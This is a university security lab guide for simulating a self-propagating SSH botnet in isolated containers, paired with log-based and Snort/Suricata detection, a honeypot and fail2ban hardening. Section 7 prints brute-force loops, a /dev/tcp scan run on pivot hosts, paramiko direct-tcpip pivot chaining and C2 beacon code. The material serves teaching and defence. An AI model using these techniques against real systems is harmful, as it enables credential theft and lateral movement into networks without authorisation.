# SSH Botnet Propagation Lab — Complete Guide
**FEUP · Systems and Security Resilience (SSR)**

---

## Table of Contents

1. [What This Lab Is](#1-what-this-lab-is)
2. [Technology Stack](#2-technology-stack)
3. [System Architecture](#3-system-architecture)
4. [The Four Scenarios](#4-the-four-scenarios)
5. [Container Roles and Credentials](#5-container-roles-and-credentials)
6. [Running the Lab](#6-running-the-lab)
7. [The Attack Side — How the Botnet Works](#7-the-attack-side--how-the-botnet-works)
8. [The Defense Side — Detection and IDS](#8-the-defense-side--detection-and-ids)
9. [Real-Time GUI](#9-real-time-gui)
10. [Collecting Data for Your Report](#10-collecting-data-for-your-report)
11. [What Each Scenario Demonstrates](#11-what-each-scenario-demonstrates)
12. [Connection to Real-World Concepts](#12-connection-to-real-world-concepts)
13. [Hardening and Countermeasures](#13-hardening-and-countermeasures)
14. [Troubleshooting](#14-troubleshooting)

---

## 1. What This Lab Is

This lab simulates a **self-propagating SSH botnet** in a controlled, isolated environment. The goal is to study both sides of a real attack:

- **Offensive side**: How a botnet autonomously discovers networks, brute-forces credentials, pivots through segmented networks, and compromises multiple hosts.
- **Defensive side**: How a blue team detects the attack using log analysis, IDS rules, and honeypots.

Everything runs inside Docker/Podman containers on your local machine. No real hosts are attacked. The networks are isolated (`internal: true` in the compose file), meaning containers cannot reach the internet.

### Learning Objectives

| Objective | Covered by |
|---|---|
| Understand SSH brute-force attacks | `botnet.py`, `simulator.py` |
| Understand network pivoting (lateral movement) | Scenarios 2, 3, 4 |
| Understand network segmentation as a defense | Multi-network Docker layouts |
| Write and interpret IDS detection rules | `monitor/rules/ssh_botnet.rules` |
| Perform log-based forensics | `monitor/analyzer.py` |
| Understand honeypot strategy | `victim-b/honeypot_logger.py` |

---

## 2. Technology Stack

### Docker / Podman — Container Isolation

**What it is**: Docker and Podman are container runtimes. A container is a lightweight isolated process that has its own filesystem, network interface, and process space, but shares the host OS kernel.

**Why we use it**: Instead of setting up 6 physical machines or 6 virtual machines (which would take hours and gigabytes of RAM), containers let us spin up a whole network topology in seconds. Each container acts as an independent "computer" on the simulated network.

**Key concept — Docker Networks**: Docker can create isolated virtual bridges (Layer 2 networks). With `internal: true`, a Docker network has no route to the internet or to the host — only containers explicitly attached to it can communicate. This is how we simulate segmented corporate networks.

```
Docker Network (internal: true)
  └── Virtual bridge (br-xxxxx)
        ├── Container A (e.g. 172.21.0.10)
        └── Container B (e.g. 172.21.0.20)
       (no external route)
```

**Docker Compose**: A YAML file that defines multiple containers, their networks, IP addresses, and build contexts. We use separate `.yml` files per scenario instead of one monolithic file so each scenario can have a different topology. The `--project-directory .` flag tells Docker Compose to resolve all build paths relative to the project root, not the yml file's directory.

---

### SSH — Secure Shell

**What it is**: SSH (Secure Shell) is a protocol for encrypted remote terminal access. Port 22 is its standard port.

**Why it's the attack vector**: SSH with password authentication is one of the most common attack surfaces on the internet. Millions of servers expose SSH on port 22 with weak passwords — this is exactly what real botnets like Mirai exploited.

**Authentication modes**:
- **Password authentication** (what we exploit): The client sends a username and password. If correct, access is granted. Easy to brute-force.
- **Key-based authentication** (the safe way): Uses asymmetric cryptography. Brute-forcing is computationally infeasible.

**In this lab**: Victim containers are deliberately configured with `PasswordAuthentication yes` and weak passwords. This is realistic — many real systems (IoT devices, legacy servers) have exactly this configuration.

---

### Paramiko — Python SSH Library

**What it is**: Paramiko is a Python library that implements the SSH2 protocol. It allows Python scripts to programmatically open SSH connections, execute commands, and create tunnels.

**Why we use it instead of the `ssh` command**: Paramiko gives full programmatic control:
- Attempt thousands of credential combinations in a loop
- Catch `AuthenticationException` precisely to continue trying on failure
- Open `direct-tcpip` channels — SSH TCP tunnels that forward arbitrary TCP through an established SSH session (the pivoting mechanism)
- Execute commands on remote hosts and capture output

**The pivoting mechanism** (`direct-tcpip`): When the botnet compromises victim1 (which bridges two networks), it cannot directly TCP-connect to hosts on the internal network. Instead it opens an SSH channel on the existing connection to victim1, asking victim1 to forward the traffic onward:

```python
transport.open_channel("direct-tcpip", (target_ip, 22), ("127.0.0.1", 0))
```

This tells victim1: "open a connection to `target_ip:22` and pipe data back through this channel." The target host sees the connection originating from victim1, not the attacker.

---

### Python — The Attack and Defense Engine

Both the botnet and the detection analyzer are Python scripts. Python is chosen because paramiko is Python-native, the standard library covers sockets, regex, HTTP servers, and threading, and the code remains readable for educational review.

---

## 3. System Architecture

### Directory Structure

```
ssh-botnet-lab/
├── attacker/               # Attacker container image
│   ├── Dockerfile          # Ubuntu + python3-paramiko
│   ├── botnet.py           # Autonomous botnet (the main attack tool)
│   ├── simulator.py        # Manual attack tool (step-by-step)
│   └── entrypoint.sh
│
├── victim/                 # Standard victim image (attack_net hosts)
│   ├── Dockerfile          # Ubuntu + openssh-server
│   └── entrypoint.sh       # Starts sshd with PasswordAuthentication yes
│
├── victim-b/               # Honeypot-capable victim image (internal_net)
│   ├── Dockerfile          # Ubuntu + openssh + fail2ban
│   ├── honeypot_logger.py  # Logs all SSH events to JSONL
│   └── entrypoint.sh
│
├── victim-c/               # Deep-chain victim image (deep_net)
│   ├── Dockerfile
│   └── entrypoint.sh
│
├── monitor/                # Detection and analysis container
│   ├── analyzer.py         # Log-based detection engine (6 rules)
│   ├── rules/
│   │   └── ssh_botnet.rules  # Suricata/Snort IDS rules
│   └── Dockerfile
│
├── scenarios/
│   ├── scenario1.yml       # Single flat network
│   ├── scenario2.yml       # Two networks (standard)
│   ├── scenario3.yml       # Three networks, two pivots
│   └── scenario4.yml       # Three networks, deep chain
│
├── start.sh                # Main launcher (builds + starts containers)
├── setup.sh                # Post-start configuration
├── gui.py                  # Real-time web dashboard (run on host)
└── report/
    └── lab.html            # Combined interactive HTML report (all scenarios)
```

### How Containers Communicate

Each container has one or more network interfaces. A dual-homed container (attached to two networks) is a pivot point — the only path between those two networks.

```
                    ┌────────────────────────────────────┐
                    │   ATTACK_NET  172.21.0.0/24        │
                    │  (Docker bridge, internal:true)    │
  ┌──────────┐      │  ┌──────────┐   ┌──────────┐      │
  │ ATTACKER │──────┤  │ VICTIM1  │   │ VICTIM2  │      │
  │172.21.0.10      │  │172.21.0.20   │172.21.0.21      │
  └──────────┘      │  └────┬─────┘   └──────────┘      │
                    └───────┼────────────────────────────┘
                            │ victim1 is dual-homed
                            │ (has an interface on BOTH networks)
                    ┌───────┼────────────────────────────┐
                    │   INTERNAL_NET  10.10.0.0/24       │
                    │  ┌────┴─────┐   ┌──────────┐      │
                    │  │ VICTIM1  │   │ VICTIM3  │      │
                    │  │10.10.0.20│   │10.10.0.10│      │
                    │  └──────────┘   └──────────┘      │
                    │                 ┌──────────┐       │
                    │                 │ HONEYPOT │       │
                    │                 │10.10.0.50│       │
                    │                 └──────────┘       │
                    └────────────────────────────────────┘
```

The attacker **cannot reach** 10.10.0.x directly — there is no route between `attack_net` and `internal_net`. Docker's `internal: true` enforces this. The only bridge is victim1. This forces the botnet to pivot.

---

## 4. The Four Scenarios

### Scenario 1 — Single Flat Network

```
ATTACK_NET 172.21.0.0/24
  attacker (172.21.0.10)
  victim1  (172.21.0.11)
  victim2  (172.21.0.12)
  victim3  (172.21.0.13)
```

All hosts are visible to the attacker. No pivoting needed.
**Expected result**: All victims compromised directly. 1 network, 3 hosts.

---

### Scenario 2 — Two Segmented Networks (Standard Lab)

```
ATTACK_NET 172.21.0.0/24
  attacker  (172.21.0.10)
  victim1   (172.21.0.20)  ← dual-homed PIVOT
  victim2   (172.21.0.21)

INTERNAL_NET 10.10.0.0/24
  victim1   (10.10.0.20)   ← same machine, second interface
  victim3   (10.10.0.10)
  honeypot  (10.10.0.50)   ← decoy host
```

The botnet must compromise victim1 first, then use it as a stepping stone.
**Expected result**: 2 networks, up to 4 hosts compromised.

---

### Scenario 3 — Three Networks, Two Parallel Pivots

```
ATTACK_NET 172.21.0.0/24
  victim1 (172.21.0.20) → bridges to internal_net
  victim2 (172.21.0.21) → bridges to extra_net

INTERNAL_NET 10.10.0.0/24
  victim3, honeypot

EXTRA_NET 10.20.0.0/24
  victim4, victim5
```

The botnet fans out in two directions after compromising the pivot machines.
**Expected result**: 3 networks, 5+ hosts.

---

### Scenario 4 — Deep Chain (Three Hops)

```
ATTACK_NET 172.21.0.0/24
  victim1  (172.21.0.20) → pivot1

INTERNAL_NET 10.10.0.0/24
  victim1  (10.10.0.20)  ← pivot1's second interface
  victim3  (10.10.0.10)  → pivot2 (also dual-homed into deep_net)
  honeypot (10.10.0.50)

DEEP_NET 10.30.0.0/24
  victim3  (10.30.0.20)  ← pivot2's second interface
  victim4  (10.30.0.10)
  victim5  (10.30.0.11)
```

The botnet must chain two SSH tunnels: attacker → victim1 → victim3 → victim4/victim5.
**Expected result**: 3 networks, 6 hosts (2 hops deep).

---

## 5. Container Roles and Credentials

### Attacker

| Field | Value |
|---|---|
| Image | Ubuntu 22.04 + paramiko + netcat |
| IP | 172.21.0.10 |
| Role | Runs `botnet.py` or `simulator.py` |

### Victims

| Container | Networks | Username | Password |
|---|---|---|---|
| victim1 | attack_net + internal_net | admin | admin |
| victim2 | attack_net | admin | admin |
| victim3 | internal_net (+deep_net in S4) | labuser | internal123 |
| victim4 | deep_net | labuser | deepnet123 |
| victim5 | deep_net | labuser | deepnet123 |
| honeypot | internal_net | (any) | (logs all attempts) |

**Why weak passwords?** Intentional. The NIST SP 800-63B report documents that a huge fraction of real-world systems still use default or dictionary passwords. The botnet's wordlist targets these exact patterns.

### Monitor

| Networks | Role |
|---|---|
| attack_net + internal_net | Passive log collection and analysis |

The monitor is on both networks, mirroring how a real SOC places a SIEM system that can observe all network segments.

---

## 6. Running the Lab

### Prerequisites

```bash
podman --version    # or docker
python3 --version   # for gui.py (no extra packages needed)
```

---

### Option A — Fully Automatic (Recommended)

`auto_run.sh` orchestrates every phase in sequence without any manual steps: it builds containers, runs the attack, triggers C2 beaconing, collects logs, and prints the detection report.

```bash
# From the project root directory
./auto_run.sh 2      # Two networks — recommended starting point
./auto_run.sh 4      # Deep chain — three hops
```

**Phases executed automatically:**

| Phase | What happens |
|---|---|
| PREFLIGHT | Pulls `ubuntu:22.04` base image if not cached (needs internet once) |
| 0 — Setup | Stops old containers, builds images one at a time, starts all services, waits for SSH |
| 1 — Recon | Scans attack_net for open SSH ports (`simulator.py scan`) |
| 2 — Brute-force | Parallel brute-force of victim1 + victim2 on attack_net |
| 3 — Pivot prep | Copies paramiko + simulator.py into compromised victim1 so it can launch attacks |
| 4 — Lateral | victim1 brute-forces victim3 and honeypot on internal_net |
| 4b — Deep lateral | (Scenarios 3+4) victim2 or victim3 brute-forces the deep network |
| 5 — C2 Beaconing | Attacker listens on port 8888; bots send HTTP heartbeat beacons |
| 7 — Detection | Collects all auth logs + C2 events, runs `analyzer.py --report` |

When it finishes, `analyzer.py` runs automatically and prints all triggered alerts.

---

### Option B — GUI (Best for Visualization)

```bash
# 1. Start containers manually first
./auto_run.sh 2     # or let it fully run

# 2. On your Kali host (NOT inside a container)
python3 gui.py

# 3. Open browser: http://localhost:5000
# 4. Click "Run Botnet" in the browser
```

The GUI runs `botnet.py` (the autonomous version) and shows the propagation live on an animated network diagram. Use this for screenshots and demos.

---

### Option C — Manual Step-by-Step

```bash
# Step 1: Start containers
./auto_run.sh 2
# (wait for it to finish setup, or ctrl-c after Phase 0)

# Step 2: Scan attack_net
podman exec -it attacker python3 /lab/simulator.py scan --network 172.21.0.

# Step 3: Brute-force a single target
podman exec -it attacker python3 /lab/simulator.py bruteforce \
  --target 172.21.0.20 --delay 1.0 --max-attempts 200

# Step 4: Run autonomous botnet
podman exec -it attacker python3 /lab/botnet.py --delay 0.5
```

---

### Watching Logs in Real Time

```bash
# Every SSH login attempt on victim1, live
podman exec -it victim1 tail -f /var/log/auth.log

# Honeypot structured JSON events
podman exec -it honeypot tail -f /var/log/lab/honeypot_events.jsonl

# C2 beacon events (after auto_run phase 5)
podman exec attacker cat /tmp/c2_events.jsonl
```

### Running Detection Manually

```bash
# Collect logs from all victims and run analyzer
podman exec victim1  cat /var/log/auth.log  > /tmp/a.log
podman exec victim3  cat /var/log/auth.log >> /tmp/a.log
podman exec honeypot cat /var/log/auth.log >> /tmp/a.log
podman cp /tmp/a.log monitor:/var/log/lab/auth.log

podman exec -it monitor python3 /lab/monitor/analyzer.py --report
podman exec -it monitor python3 /lab/monitor/analyzer.py --rules
```

### Reset Between Runs

```bash
# Full reset and fresh run
./auto_run.sh 2

# Reset just the GUI view (browser)
# Click Reset View button — clears server state then reloads
```

---

## 7. The Attack Side — How the Botnet Works

`attacker/botnet.py` is fully autonomous — it does not know the scenario topology in advance. It discovers the network the same way a real botnet would.

### Phase 1 — Local Network Discovery

```python
def get_local_networks():
    result = subprocess.run(["ip", "route"], ...)
    # Output: "172.21.0.0/24 dev eth0 proto kernel scope link src 172.21.0.10"
    # Extracts prefix "172.21.0."
```

The attacker runs `ip route` to see which networks its interfaces can reach. This is exactly what an attacker does after initial access — enumerate the local network topology.

### Phase 2 — SSH Port Scanning

```python
def probe_ssh(ip, timeout=1.0):
    sock = socket.create_connection((ip, 22), timeout=timeout)
```

For each discovered network, the botnet TCP-connects to port 22 of each IP from `.1` to `.49`. A successful connection means SSH is open. This is a host sweep — simplified but functionally identical to what `nmap -p 22 172.21.0.0/24` does.

### Phase 3 — Credential Brute-Force

```python
USERNAMES = ["labuser", "admin", "root", "deploy", ...]
PASSWORDS = ["admin", "password", "123456", "letmein", ...]

for username, password in shuffle(all_combinations):
    client.connect(target, username=username, password=password, timeout=5)
    # AuthenticationException → wrong credentials → try next
    # No exception → SUCCESS → host compromised
```

The botnet tries every username × password combination in **random order**. Random ordering simulates real attackers who randomize to avoid simple sequence-based IDS detection (a fixed sequence like `admin:admin` always first would be trivially blocked).

### Phase 4 — Pivot Discovery

After compromising a host, the botnet SSHes into it and runs `ip route`:

```python
def get_networks_from_host(ip, user, password):
    client.connect(ip, username=user, password=password)
    _, stdout, _ = client.exec_command("ip route")
    # Parses output to find networks this host can reach
    # Returns prefixes not yet scanned
```

If victim1 has an interface on `10.10.0.0/24`, this returns `"10.10.0."` as a new network to scan.

### Phase 5 — Pivoted Network Scanning

The attacker cannot TCP-connect directly to `10.10.0.x` (Docker isolates the networks). The botnet solves this by running the scan command **on the pivot host** via SSH exec:

```python
scan_cmd = (
    "for h in 10.10.0.1 ... 10.10.0.49; do "
    "(bash -c \"exec 3<>/dev/tcp/$h/22\" 2>/dev/null && echo $h) & "
    "done; wait"
)
# This executes on victim1, which CAN reach 10.10.0.x
client.exec_command(scan_cmd)
```

`/dev/tcp/HOST/PORT` is a bash built-in that opens a TCP connection. Run on victim1, it probes the internal network from victim1's perspective.

### Phase 6 — Tunnelled Brute-Force

Once a new target is found (e.g., victim3 at 10.10.0.10), the botnet cannot connect to it directly. It uses a **paramiko TCP tunnel** through the compromised pivot:

```python
# 1. Open SSH connection to pivot (victim1)
pivot_transport = paramiko.Transport(("172.21.0.20", 22))
pivot_transport.connect(username="admin", password="admin")

# 2. Ask victim1 to open a connection to victim3 and pipe it back
channel = pivot_transport.open_channel(
    "direct-tcpip",        # SSH forwarding channel type
    ("10.10.0.10", 22),    # destination: victim3's SSH
    ("127.0.0.1", 0)       # local source address
)

# 3. Wrap the channel as an SSH transport → authenticate against victim3
t_victim3 = paramiko.Transport(channel)
t_victim3.auth_password(username, password)
```

From victim3's perspective, the connection comes from victim1 (`10.10.0.20`). The attacker's IP (`172.21.0.10`) never appears in victim3's logs — only victim1 does. This is what makes pivoting forensically challenging.

For deeper chains (Scenario 4), the botnet chains multiple transports: attacker → victim1 transport → direct-tcpip to victim3 → victim3 transport → direct-tcpip to victim4.

### Phase 7 — C2 Beaconing

After spreading, the botnet establishes a Command and Control (C2) channel. This simulates how real botnets phone home to receive instructions.

**How it works in this lab (`auto_run.sh` Phase 5):**

1. The attacker starts a C2 server listening on port 8888:
   ```python
   srv.bind(('0.0.0.0', 8888)); srv.listen(10)
   ```

2. Each compromised bot sends an HTTP POST heartbeat every 2 seconds:
   ```python
   payload = json.dumps({'bot_id': 'victim1', 'type': 'HEARTBEAT', 'seq': 1, 'ts': '...'})
   s.send(b'POST /beacon HTTP/1.1\r\n...\r\n\r\n' + payload)
   ```

3. In Scenarios ≥ 2, victim1 acts as a **C2 relay** (port 8889). victim3 (in internal_net) cannot reach the attacker directly, so it beacons to victim1, which logs it. This models tiered C2 architectures where inner bots can only reach an intermediate relay.

4. The C2 server logs every beacon to `/tmp/c2_events.jsonl` on the attacker. These are merged with honeypot events for the analyzer to detect (rule C2-001).

**Why beaconing is a key detection signal**: The regularity of the interval (low jitter) is what separates bot beacons from human HTTP traffic. Humans browse irregularly; a bot sends a packet every 2 seconds, every time, with near-zero variance. This pattern is detectable in proxy logs or with a network IDS threshold rule.

---

### Propagation Loop Summary

```
Phase 1: ip route → discovers 172.21.0.
Phase 2: scan 172.21.0.0/24 → finds victim1 (172.21.0.20), victim2 (172.21.0.21)
Phase 3: brute_force(172.21.0.20) → COMPROMISED (admin:admin, attempt #9)
Phase 4: ip route on victim1 → discovers 10.10.0. (NEW!)
Phase 5: scan 10.10.0.0/24 via victim1 → finds victim3, honeypot
Phase 6: brute_force_via_chain(10.10.0.10, via=victim1) → COMPROMISED
Phase 6: brute_force_via_chain(10.10.0.50, via=victim1) → HONEYPOT HIT
Phase 7: victim1 beacons to attacker:8888 (HEARTBEAT ×5)
Phase 7: victim3 beacons to victim1:8889 (relayed HEARTBEAT ×5)
```

---

## 8. The Defense Side — Detection and IDS

### Log Sources

#### `/var/log/auth.log` — SSH Authentication Log

OpenSSH writes every authentication event here. Key entries:

```
# Failed attempt
May 24 12:01:05 victim1 sshd[1234]: Failed password for admin from 172.21.0.10 port 54321

# Successful login
May 24 12:02:10 victim1 sshd[1234]: Accepted password for admin from 172.21.0.10 port 54322

# Unknown username
May 24 12:01:06 victim1 sshd[1235]: Invalid user deploy from 172.21.0.10
```

#### `honeypot_events.jsonl` — Structured Honeypot Log

Every event written as one JSON object per line:

```json
{"ts":"2024-05-24T12:05:00","event":"ssh_failed_auth","src_ip":"10.10.0.20","user":"admin","role":"honeypot"}
```

Any event here is a confirmed attack signal — no legitimate user ever connects to the honeypot.

---

### Detection Rules (`analyzer.py`)

#### SSH-001 — Brute-Force Detection

**Logic**: Count failed SSH attempts per source IP. If count ≥ 5, fire alert.

**Why this threshold?** Legitimate users mistype passwords 1-2 times at most. Five consecutive failures from the same IP within seconds is statistically impossible for a human — it must be automation.

**Severity scaling**: HIGH at 5-19 failures, CRITICAL at 20+ (high-speed automated attack).

#### SSH-002 — Password Spray Detection

**Logic**: Same IP targeting many different usernames with few attempts per user.

**Why it is different from brute-force**: Spraying trades speed for stealth. Instead of hammering one account (which triggers lockout after N failures), the attacker tries one or two passwords against many accounts. Per-account thresholds never fire. The signal is width (many different usernames) not depth (many attempts per account).

#### SSH-003 — Successful Brute-Force (Most Critical)

**Logic**: An IP that had prior failures AND then logged in successfully.

This is the smoking gun — the brute-force worked. The attacker now has an active shell. Response must be immediate: kill the session, lock the account, block the IP, search for persistence mechanisms.

#### LATERAL-001 — East-West SSH (Pivot Detection)

**Logic**: SSH connections originating **from** an internal IP (10.10.x, 10.20.x, 10.30.x) to another internal IP.

In a normal network, SSH comes from admins outside (via jump hosts) or from a management network. Internal hosts initiating SSH to other internal hosts is a hallmark of lateral movement. In this lab, when the botnet uses victim1 (10.10.0.20) to brute-force victim3, victim3's `auth.log` sees connections from `10.10.0.20` — which triggers this rule.

#### HONEYPOT-001 — Honeypot Interaction

**Logic**: Any connection to the honeypot IP (10.10.0.50).

No legitimate service or user should ever connect to this host. Its address is unknown to anyone except administrators. Any hit proves:
1. The attacker has network access to the internal segment (successful pivot)
2. They are scanning for hosts they don't know about
3. They cannot distinguish the honeypot from a real server

**Zero false positives** — every hit is a confirmed attacker.

#### C2-001 — Beaconing Detection

**Logic**: Regular-interval heartbeat events in the honeypot log (simulating C2 communication).

Real botnets phone home to a C2 (Command and Control) server at regular intervals. The regularity (low jitter) is the key signal — human HTTP traffic is irregular, bot beacons are suspiciously rhythmic. In production, this is detected by analyzing proxy logs for regular-interval connections to unusual IPs.

---

### IDS Rules (`monitor/rules/ssh_botnet.rules`)

These are Snort/Suricata-format rules for network-level detection:

```
# Detect rapid SSH connection attempts (brute-force)
alert tcp any any -> $HOME_NET 22 (
    msg:"SSH-001 Brute-force: Rapid new SSH connections";
    flow:to_server,not_established;
    threshold: type threshold, track by_src, count 5, seconds 60;
    sid:1000001;
)
```

**Reading this rule**:
- `alert tcp any any -> $HOME_NET 22` — match TCP to port 22 on our network
- `flow:to_server,not_established` — match only new connection attempts (SYN packets), not existing sessions
- `threshold: count 5, seconds 60` — fire only if the same source triggers this 5 times in 60 seconds
- `sid:1000001` — unique rule ID

**Lateral movement rule**:
```
alert tcp $HOME_NET any -> $HOME_NET 22 (
    msg:"LATERAL-001 Lateral movement: internal host initiating SSH";
    threshold: count 2, seconds 120;
    sid:1000020;
)
```

Fires when an internal host tries to SSH to another internal host — the cross-segment pivot pattern.

---

## 9. Real-Time GUI

`gui.py` is a Python web server (stdlib only — no Flask or extra packages):

1. Launches the botnet inside the attacker container as a subprocess
2. Parses every output line using regex patterns
3. Broadcasts parsed events to connected browsers via **SSE (Server-Sent Events)**
4. The browser renders an animated SVG network diagram

**SSE** is a browser standard for one-way real-time push from server to client over a persistent HTTP connection. Simpler than WebSockets for this use case since the browser only receives (never sends) data.

### Running the GUI

```bash
# On your Kali host machine (NOT inside a container)
python3 gui.py
# Open browser: http://localhost:5000
```

### Controls

| Button | Action |
|---|---|
| Run Botnet | Starts `botnet.py` inside the attacker container |
| Stop | Sends SIGTERM to the botnet process |
| Reset View | Clears server state and reloads the page clean |
| Delay selector | 0.2s = fast, 0.5s = normal, 1.0s = realistic |

### What the Diagram Shows

- **Zone boxes**: Each Docker network appears as a colored rectangle (red = attack_net, blue = internal_net, teal = deep_net)
- **Host nodes**: Appear when discovered (blue = found, orange = under attack, gold glow = compromised, grey = brute-force failed)
- **Animated dots**: Represent SSH connection attempts — red during attack, green on success
- **Dashed edges**: SSH probes; solid green edges = successful compromise paths

---

## 10. Collecting Data for Your Report

### What to Capture Per Scenario Run

#### Botnet Propagation Log

```bash
# Save full output including final report
podman exec attacker python3 /lab/botnet.py 2>&1 | tee /tmp/botnet_s2.log

# The final section shows:
# - Total compromised hosts
# - Networks scanned
# - Credentials found per host
# - Infection chain (who compromised whom via whom)
```

#### Auth Log Statistics (Victim Perspective)

```bash
podman exec victim1 cat /var/log/auth.log > /tmp/victim1_auth.log

# Count total failed attempts
grep "Failed password" /tmp/victim1_auth.log | wc -l

# Unique attacker IPs (should be victim1's IP for pivoted attacks)
grep "Failed password" /tmp/victim1_auth.log | grep -oP 'from \K[\d.]+' | sort -u

# Usernames tried by attacker
grep "Failed password" /tmp/victim1_auth.log | grep -oP 'for \K\S+' | sort | uniq -c | sort -rn
```

#### Detection Output

```bash
# Get detection report and save it
podman exec victim1 cat /var/log/auth.log > /tmp/auth.log
podman cp /tmp/auth.log monitor:/var/log/lab/auth.log
podman exec monitor python3 /lab/monitor/analyzer.py --report > /tmp/detection_s2.txt
cat /tmp/detection_s2.txt
```

#### Honeypot Events

```bash
podman exec honeypot cat /var/log/lab/honeypot_events.jsonl
```

#### Timing

```bash
# How long does full compromise take?
time podman exec attacker python3 /lab/botnet.py --delay 0.5
```

---

### Metrics Table (fill in per scenario)

| Metric | S1 | S2 | S3 | S4 |
|---|---|---|---|---|
| Networks discovered | 1 | 2 | 3 | 3 |
| Hosts found (SSH open) | | | | |
| Hosts compromised | | | | |
| Brute-force attempts (total) | | | | |
| Time to full compromise (s) | | | | |
| Pivot hops required | 0 | 1 | 1 | 2 |
| IDS alerts fired | | | | |
| Honeypot hits | | | | |
| Credentials used most | | | | |

### Screenshots / Evidence for Report

1. **Botnet terminal output** — the `BOTNET PROPAGATION REPORT` section
2. **`auth.log` excerpt** — showing the Failed / Accepted pattern
3. **Detection report** — `analyzer.py --report` output with triggered rules
4. **GUI screenshot** — network diagram with compromised nodes and infection edges
5. **Honeypot log** — JSON events showing the attacker reached the decoy

---

## 11. What Each Scenario Demonstrates

### Scenario 1 → Unprotected Flat Network

No segmentation means once the attacker reaches the network, all hosts are equally accessible. One compromised host does not make things worse — they were all already exposed.

**Security lesson**: Flat networks are catastrophically vulnerable. The blast radius of any single compromise is the entire network.

### Scenario 2 → Segmentation Delays, Not Prevents

Segmentation stops direct attacks against internal hosts. But a dual-homed pivot host that gets compromised becomes the attacker's bridge. Segmentation adds a mandatory first step (compromise the pivot) but does not permanently protect the inner network.

**Security lesson**: Network segmentation raises the bar. Combined with strong credentials on pivot hosts and monitoring for east-west SSH, it significantly hardens the network.

### Scenario 3 → Parallel Attack Paths

Multiple pivot hosts create multiple attack paths. The botnet fans out simultaneously, which both speeds up compromise and complicates detection (multiple sources of lateral movement).

**Security lesson**: Every dual-homed host is a risk multiplier. Minimize them, monitor them more strictly, and apply tighter access controls to any machine that bridges network zones.

### Scenario 4 → Defense in Depth

Three network layers mean three required brute-force phases, three levels of detection opportunity, and two successful pivots. Each additional hop takes more time and generates more log evidence.

**Security lesson**: Defense in depth significantly increases attacker effort, time, and detection exposure. The attacker must succeed at every layer; the defender needs to detect at only one.

---

## 12. Connection to Real-World Concepts

### This Lab vs. Real Botnets

| Feature | This Lab | Real Botnets (e.g., Mirai) |
|---|---|---|
| Credential method | Wordlist brute-force | Same — default credential databases |
| Network discovery | `ip route` | Same — interface enumeration |
| Propagation protocol | SSH (paramiko) | SSH, Telnet, SMB, RDP |
| Pivot technique | `direct-tcpip` tunnel | Same, or SOCKS proxies |
| Persistence | None (lab scope) | Crontab, init scripts, rootkits |
| C2 communication | HTTP POST beacons on port 8888, relayed via victim1 | HTTP beaconing, IRC, DNS |
| Scale | 6 hosts | Millions (Mirai: 600k+ bots) |

### Why SSH Brute-Force Is Not Theoretical

Shodan.io (a search engine for internet-facing devices) lists tens of millions of SSH servers on port 22, many with password authentication enabled. Common default credentials (`admin:admin`, `root:root`, `pi:raspberry`) are tried by real botnets within minutes of a device appearing online. The timeline from "device powered on" to "compromised" for an IoT device with default SSH credentials has been measured at under 60 seconds on some networks.

### The Detection Tools Are Production-Grade

The rules in `analyzer.py` and `ssh_botnet.rules` are adapted from real SIEM detection rules used in Splunk, IBM QRadar, and the Snort/Suricata community rulesets. The same logic runs in actual security operations centers. The thresholds (5 failures = brute-force, 3 usernames = spray) are taken directly from industry guidance.

### Honeypots in Production

Tools like **Cowrie** (an open-source SSH honeypot used by thousands of organizations) work exactly like `victim-b` — log every connection attempt, capture all commands typed, alert on any hit. Cowrie is deployed on real internet IPs and provides threat intelligence on active botnet campaigns.

### The Asymmetry Problem

This lab makes visible a fundamental asymmetry in network security:

- **Attacker**: needs to succeed once, can automate at machine speed, can try thousands of credentials silently
- **Defender**: needs to succeed every time, is often reactive, must filter signals from noise

This is why the defensive measures shown (segmentation + monitoring + honeypots + strong credentials) must be applied together — no single control is sufficient.

---

## 13. Hardening and Countermeasures

This section shows how to test real defensive tools against the lab botnet. The victim containers already have some tools installed (`fail2ban` is in `victim-b`). You can apply these defenses and observe how they affect the attack.

---

### Countermeasure 1 — fail2ban (Automatic IP Banning)

**What it is**: fail2ban is a daemon that watches log files and automatically blocks IP addresses that show suspicious patterns (too many failed logins). It works by adding `iptables` DROP rules.

**Why it matters**: fail2ban is the most common first line of defense against SSH brute-force. It is installed by default on many Linux distributions and cloud VM templates.

**How to enable it on victim1 (during a lab run):**

```bash
# Enter victim1
podman exec -it victim1 bash

# Install fail2ban (it's already in victim-b; install manually in victim)
apt-get install -y fail2ban

# Create a jail config for SSH
cat > /etc/fail2ban/jail.local << 'EOF'
[sshd]
enabled  = true
port     = 22
filter   = sshd
logpath  = /var/log/auth.log
maxretry = 5        # ban after 5 failures
findtime = 60       # within 60 seconds
bantime  = 300      # ban for 5 minutes
EOF

# Start fail2ban
service fail2ban start

# Watch it in action
fail2ban-client status sshd
```

Now run the botnet from the attacker. After 5 failed attempts, the attacker's IP gets banned:

```bash
# On attacker — check banned IPs on victim1
podman exec victim1 iptables -L f2b-sshd -n

# You should see:
# REJECT  all  --  172.21.0.10  0.0.0.0/0
```

**What the botnet does**: The botnet uses random credential ordering and a configurable delay. With `--delay 0.2` the ban fires quickly; with `--delay 1.5` it may find the correct credential in the first 5 attempts and succeed before the ban.

**Key lesson**: fail2ban is effective against slow brute-force and automated scanners, but an attacker who knows the credential on the first few attempts (or uses a low-jitter delay that doesn't exceed the threshold) can still succeed. fail2ban must be combined with strong passwords and key-based auth.

---

### Countermeasure 2 — Changing the SSH Port

**What it is**: Moving SSH from port 22 to a non-standard port (e.g., 2222, 22022, 44422). This is called "security through obscurity."

**Why it helps**: The botnet's scanner only probes port 22. If SSH listens on a different port, `probe_ssh()` will not find it and the host will not be targeted. This eliminates automated mass-scanning botnets entirely.

**Why it is not enough alone**: A targeted attacker who runs a full port scan (`nmap -p- victim`) will find SSH on any port within seconds. Port obscurity works against opportunistic automated attacks, not targeted ones.

**How to test it on victim1:**

```bash
# Enter victim1
podman exec -it victim1 bash

# Edit sshd config — change port
sed -i 's/^Port 22/Port 2222/' /etc/ssh/sshd_config

# Restart sshd
kill -HUP $(pgrep sshd)   # or: service ssh restart

# Verify SSH now listens on 2222
ss -tlnp | grep 2222
```

Now run the botnet. It scans for port 22 — victim1 won't appear as a target:

```bash
# Botnet output: "Found 0 SSH target(s) on 172.21.0.0/24" (or only finds victim2)
podman exec -it attacker python3 /lab/botnet.py
```

**To connect manually on the new port:**

```bash
podman exec -it attacker ssh -p 2222 admin@172.21.0.20
```

